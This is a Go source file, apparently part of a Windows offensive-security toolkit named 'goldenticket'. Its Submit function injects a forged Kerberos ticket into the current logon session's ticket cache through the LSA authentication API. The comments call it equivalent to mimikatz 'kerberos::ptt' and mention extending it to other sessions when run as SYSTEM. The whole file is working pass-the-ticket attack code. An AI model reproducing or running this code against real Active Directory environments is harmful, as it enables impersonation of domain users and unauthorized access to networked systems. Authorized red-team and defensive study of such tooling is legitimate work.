//go:build windows

package goldenticket

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Submit injects a kirbi (KRB-CRED bytes) directly into the calling
// user's TGT cache via Secur32!LsaCallAuthenticationPackage with the
// KerbSubmitTicketMessage opcode. After Submit returns nil, the next
// outbound Kerberos exchange on this logon session uses the forged
// ticket — equivalent to mimikatz `kerberos::ptt`.
//
// Cross-platform note: this entry point is Windows-only. On Linux,
// see Submit (inject_other.go) which returns ErrPlatformUnsupported.
//
// Authentication mode: uses LsaConnectUntrusted, which does NOT
// require admin and operates on the calling logon session. Operators
// who need to inject into a *different* session must run as SYSTEM
// and switch to LsaRegisterLogonProcess — that's a follow-up.
//
// Errors returned wrap one of:
//   - ErrSubmit if any of the LSA call sequence (Connect / Lookup /
//     CallAuth) returns a non-success NTSTATUS.
//   - ErrInvalidParams if kirbi is empty.
func Submit(kirbi []byte) error {
	if len(kirbi) == 0 {
		return fmt.Errorf("%w: kirbi is empty", ErrInvalidParams)
	}

	secur32 := windows.NewLazySystemDLL("secur32.dll")
	procLsaConnectUntrusted := secur32.NewProc("LsaConnectUntrusted")
	procLsaLookupAuth := secur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuth := secur32.NewProc("LsaCallAuthenticationPackage")
	procLsaDeregister := secur32.NewProc("LsaDeregisterLogonProcess")
	procLsaFreeReturnBuffer := secur32.NewProc("LsaFreeReturnBuffer")

	// 1. LsaConnectUntrusted
	var lsaHandle windows.Handle
	r1, _, _ := procLsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&lsaHandle)),
	)
	if r1 != 0 {
		return fmt.Errorf("%w: LsaConnectUntrusted returned NTSTATUS 0x%08X", ErrSubmit, r1)
	}
	defer procLsaDeregister.Call(uintptr(lsaHandle))

	// 2. LsaLookupAuthenticationPackage("Kerberos") → authPkg ULONG
	const kerbName = "Kerberos"
	kerbBuf := []byte(kerbName)
	lsaName := lsaString{
		Length:        uint16(len(kerbBuf)),
		MaximumLength: uint16(len(kerbBuf)),
		Buffer:        &kerbBuf[0],
	}
	var authPkg uint32
	r1, _, _ = procLsaLookupAuth.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(&lsaName)),
		uintptr(unsafe.Pointer(&authPkg)),
	)
	if r1 != 0 {
		return fmt.Errorf("%w: LsaLookupAuthenticationPackage(\"Kerberos\") returned NTSTATUS 0x%08X", ErrSubmit, r1)
	}

	// 3. Build KERB_SUBMIT_TKT_REQUEST with the kirbi appended.
	const kerbSubmitTicketMessage uint32 = 21
	const headerSize = 36 // see comment on submitRequestHeader for layout.
	buf := make([]byte, headerSize+len(kirbi))
	binary.LittleEndian.PutUint32(buf[0:4], kerbSubmitTicketMessage)
	// LogonId LUID at [4:12] = 0 (current session).
	// Flags at [12:16] = 0.
	// KERB_CRYPTO_KEY32 at [16:28] = all zero (no separate session key
	// — the kirbi already contains the encrypted ticket).
	binary.LittleEndian.PutUint32(buf[28:32], uint32(len(kirbi))) // KerbCredSize
	binary.LittleEndian.PutUint32(buf[32:36], headerSize)         // KerbCredOffset
	copy(buf[headerSize:], kirbi)

	// 4. LsaCallAuthenticationPackage
	var responseBuf uintptr
	var responseLen uint32
	var subStatus uint32
	r1, _, _ = procLsaCallAuth.Call(
		uintptr(lsaHandle),
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&responseBuf)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&subStatus)),
	)
	if responseBuf != 0 {
		procLsaFreeReturnBuffer.Call(responseBuf)
	}
	if r1 != 0 {
		return fmt.Errorf("%w: LsaCallAuthenticationPackage returned NTSTATUS 0x%08X (subStatus 0x%08X)", ErrSubmit, r1, subStatus)
	}
	if subStatus != 0 {
		return fmt.Errorf("%w: KerbSubmitTicketMessage subStatus NTSTATUS 0x%08X", ErrSubmit, subStatus)
	}
	return nil
}

// lsaString mirrors the LSA_STRING / STRING ANSI struct expected by
// LsaLookupAuthenticationPackage. NOT to be confused with
// LSA_UNICODE_STRING (used by NTAPI / SAMR / etc.) — the Lsa* logon
// flow takes ANSI for the package name.
type lsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *byte
}
